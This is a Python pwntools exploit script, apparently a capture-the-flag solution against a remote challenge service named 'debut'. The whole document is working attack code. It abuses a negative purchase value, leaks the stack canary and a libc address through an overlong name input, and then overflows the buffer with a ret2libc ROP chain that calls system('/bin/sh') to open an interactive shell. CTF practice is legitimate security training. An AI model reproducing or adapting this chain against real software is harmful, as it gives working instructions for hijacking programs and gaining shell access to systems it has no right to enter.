from pwn import *

# p = process('./distribute/share/debut')
p = remote('ctf.adl.tw', 10006)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')


def stream():
    p.sendafter(b'> ', b'1')


def buy_buff(idx):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'> ', b'b')
    p.sendafter(b'> ', str(idx).encode())


def buy_stickers(num):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'> ', b'b')
    p.sendafter(b'> ', b'6')
    p.sendafter(b'> ', str(num).encode())


def set_name():
    p.sendafter(b'> ', b'3')


p.sendafter(b'name: ', b'gura')

p.sendafter(b'> ', b'2')
p.sendafter(b'> ', b's')
p.sendafter(b'> ', b'-1')

buy_buff(1)
buy_buff(2)
buy_buff(3)
buy_buff(4)
buy_buff(5)
buy_stickers(1000000)

stream()

p.sendafter(b'> ', b'3')
p.sendafter(b'> ', b'a'*0x29)
p.recvuntil(b'a'*0x28)
canary = u64(p.recv(8)) - ord('a')
success('canary = %x', canary)
p.sendafter(b'(Y/N)\n', b'n')
p.sendafter(b'> ', b'a'*88)
p.recvuntil(b'a'*88)
__libc_start_main = u64(p.recv(6).ljust(8, b'\x00'))
base = __libc_start_main - libc.sym['__libc_start_main'] - 243
success('libc base 0x%x', base)
p.sendafter(b'(Y/N)\n', b'n')

payload = b'a'*0x28
payload += p64(canary)
payload += b'a'*8

# ROP
pop_rdi = base + 0x26b72
ret = base + 0x25679
system = base + libc.sym['system']
sh = base + next(libc.search(b'/bin/sh'))
payload += p64(pop_rdi)
payload += p64(sh)
payload += p64(ret)
payload += p64(system)

# one_gadget
# payload += p64(base + 0xe6c81)

p.sendafter(b'> ', payload)
p.sendafter(b'(Y/N)\n', b'y')

p.interactive()
